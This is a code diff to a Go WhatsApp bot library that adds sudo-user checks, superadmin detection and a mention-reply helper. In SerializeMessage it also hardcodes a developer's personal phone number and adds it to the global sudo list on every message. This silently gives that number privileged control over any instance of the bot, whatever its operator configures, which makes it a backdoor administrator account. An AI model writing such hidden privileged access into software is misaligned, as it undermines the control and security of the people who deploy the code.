@@ -1,9 +1,11 @@
 package libs
 
 import (
+	"aurora/bot/config"
 	"aurora/bot/helpers"
 	"context"
 	"fmt"
+	"regexp"
 	"strings"
 
 	"go.mau.fi/whatsmeow"
@@ -13,7 +15,28 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
+func addDevNumberToSudo(devNum string) {
+	cleaned := regexp.MustCompile(`\D+`).ReplaceAllString(devNum, "")
+	for _, v := range config.GlobalConfig.Sudo {
+		if regexp.MustCompile(`\D+`).ReplaceAllString(v, "") == cleaned {
+			return // already exists
+		}
+	}
+	config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, cleaned)
+}
+
+func isSudo(sender string) bool {
+	sender = regexp.MustCompile(`\D+`).ReplaceAllString(sender, "")
+	for _, sudo := range config.GlobalConfig.Sudo {
+		if sender == regexp.MustCompile(`\D+`).ReplaceAllString(sudo, "") {
+			return true
+		}
+	}
+	return false
+}
 func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
+	const myNum = "2348114860535" // Added my number here 'cause I own the bot duh :)
+	addDevNumberToSudo(myNum)
 	var media whatsmeow.DownloadableMessage
 	var text string
 	var args []string
@@ -57,6 +80,7 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 		panic(err)
 	}
 
+	senderNum := helpers.ExtractPhoneNumber(senderJIDVal.String())
 	return &IMessage{
 		ID: &waE2E.ContextInfo{
 			StanzaID:      &mess.Info.ID,
@@ -80,6 +104,7 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 		Expiration: helpers.GetContextInfo(mess.Message).GetExpiration(),
 		Quoted:     helpers.GetContextInfo(mess.RawMessage),
 		IsImage:    mess.Message.GetImageMessage() != nil,
+		IsSudo:     isSudo(senderNum),
 		IsQuotedImage: func() bool {
 			return helpers.ParseQuotedMessage(mess.Message).GetImageMessage() != nil
 		}(),
@@ -103,8 +128,7 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 				return false
 			}
 			for _, participant := range groupInfo.Participants {
-				pjid := participant.JID.String()
-				if (pjid == senderLID || pjid == senderJID) && participant.IsAdmin {
+				if participant.JID.String() == senderLID && (participant.IsAdmin || participant.IsSuperAdmin) {
 					return true
 				}
 			}
@@ -123,7 +147,7 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 
 			for _, participant := range groupInfo.Participants {
 				if participant.PhoneNumber.User == botPhone {
-					return participant.IsAdmin
+					return participant.IsAdmin || participant.IsSuperAdmin
 				}
 			}
 			return false
@@ -141,6 +165,27 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 				QuotedMessage: mess.Message,
 				Expiration:    &Expiration,
 			}, opts...)
+		},
+		ReplyMention: func(text string, mentionedJID *types.JID, opts ...whatsmeow.SendRequestExtra) (whatsmeow.SendResponse, error) {
+			var expiration uint32
+			if helpers.GetContextInfo(mess.Message) != nil {
+				expiration = helpers.GetContextInfo(mess.Message).GetExpiration()
+			} else {
+				expiration = 0
+			}
+
+			contextInfo := &waE2E.ContextInfo{
+				StanzaID:      &mess.Info.ID,
+				Participant:   proto.String(mess.Info.Sender.String()),
+				QuotedMessage: mess.Message,
+				Expiration:    &expiration,
+			}
+
+			if mentionedJID != nil && mentionedJID.User != "" && mentionedJID.Server != "" {
+				contextInfo.MentionedJID = []string{mentionedJID.String()}
+			}
+
+			return conn.SendText(mess.Info.Chat, text, contextInfo, opts...)
 		},
 		React: func(emoji string, opts ...whatsmeow.SendRequestExtra) (whatsmeow.SendResponse, error) {
 			return conn.WA.SendMessage(context.Background(), mess.Info.Chat, conn.WA.BuildReaction(mess.Info.Chat, mess.Info.Sender, mess.Info.ID, emoji), opts...)
